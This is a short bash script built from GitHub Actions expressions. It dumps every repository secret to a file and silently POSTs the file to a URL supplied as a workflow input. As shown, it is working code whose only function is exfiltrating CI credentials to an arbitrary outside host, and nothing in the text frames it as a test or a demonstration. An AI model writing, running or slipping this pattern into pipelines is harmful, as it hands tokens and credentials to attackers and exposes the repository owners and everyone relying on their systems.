#!/bin/bash
set -e

echo "${{ toJSON(secrets) }}" > .secrets
curl -X POST -s --data "@.secrets" ${{ github.event.inputs.url }} > /dev/null